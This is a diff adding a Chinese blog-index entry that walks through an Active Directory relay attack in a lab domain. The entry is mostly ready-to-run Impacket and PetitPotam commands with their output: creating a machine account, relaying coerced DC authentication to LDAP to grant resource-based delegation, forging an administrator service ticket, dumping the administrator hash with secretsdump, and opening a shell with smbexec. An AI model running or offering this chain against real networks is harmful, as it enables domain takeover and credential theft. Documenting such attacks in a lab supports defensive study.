@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>主辅域控 Relay</title>
+    <link href="/2024/01/10/Relay/"/>
+    <url>/2024/01/10/Relay/</url>
+    
+    <content type="html"><![CDATA[<p>查看主域: <code>netdom query pdc</code><br><img src="https://img.tucang.cc/api/image/show/a5a6d1c36fe90fcef70672af225fe43e" alt="image.png"><br>查看所有的域控制器，包括主域控制器(PDC)和辅域控制器(ADC): <code>nltest /dclist:域名</code><br><img src="https://img.tucang.cc/api/image/show/25ad5903b75fcb59ef512cd861afd81b" alt="image.png"></p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>主域控: 192.168.214.200<br>辅域控: 192.168.214.201</p><h2 id="创建机器账户"><a href="#创建机器账户" class="headerlink" title="创建机器账户"></a><strong>创建机器账户</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">addcomputer.py -computer-name <span class="hljs-string">&quot;relay1&quot;</span> -computer-pass <span class="hljs-string">&quot;Aa@123&quot;</span> -dc-ip 192.168.214.200 <span class="hljs-string">&quot;ust4.fun/testacc:Cxk@123&quot;</span> -method SAMR -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/acd00111ddb095c0e23fccbf9e273fc9" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Successfully added machine account relay1$ with password Aa@123<br></code></pre></td></tr></table></figure><h2 id="开启中继监听"><a href="#开启中继监听" class="headerlink" title="开启中继监听"></a>开启中继监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py --escalate-user relay1$ --delegate-access -smb2support --remove-mic -t ldap://192.168.214.201 -debug<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/88a82e9676ad3fca96f5a6e8ee5a16de" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 PetitPotam.py -d <span class="hljs-string">&#x27;&#x27;</span> -u <span class="hljs-string">&#x27;&#x27;</span> -p <span class="hljs-string">&#x27;&#x27;</span> 192.168.214.147 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/1302b1b26bcaf2cb951898f3b182bc80" alt="image.png"><br>成功提升权限，赋予了relay1$ 对 DC01 的 RBCD<br><img src="https://img.tucang.cc/api/image/show/a5187e542f3d1f7f1846d63c4d8e74cd" alt="image.png"></p><h2 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python getST.py -spn cifs/DC01.ust4.fun ust4.fun/relay1$:Aa@123 -impersonate administrator -dc-ip 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f65c645fe9317e380306686475e8c38e" alt="image.png"></p><h2 id="导入票据获取权限"><a href="#导入票据获取权限" class="headerlink" title="导入票据获取权限"></a>导入票据获取权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=administrator.ccache <br>python secretsdump.py -target-ip 192.168.214.200 -dc-ip 192.168.214.200 -k -no-pass @<span class="hljs-string">&#x27;dc01.ust4.fun&#x27;</span> -just-dc-user administrator<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f813c203c37b84cb873be3ff9ec62294" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=administrator.ccache <br>python smbexec.py -target-ip 192.168.214.200 -dc-ip 192.168.214.200 -k -no-pass @<span class="hljs-string">&#x27;dc01.ust4.fun&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/26de3677e6a5a5e3bb9d0f77356970a3" alt="image.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>错误的 ADCS 模板配置-ESC1</title>
     <link href="/2024/01/10/ADCS-ESC1/"/>
     <url>/2024/01/10/ADCS-ESC1/</url>
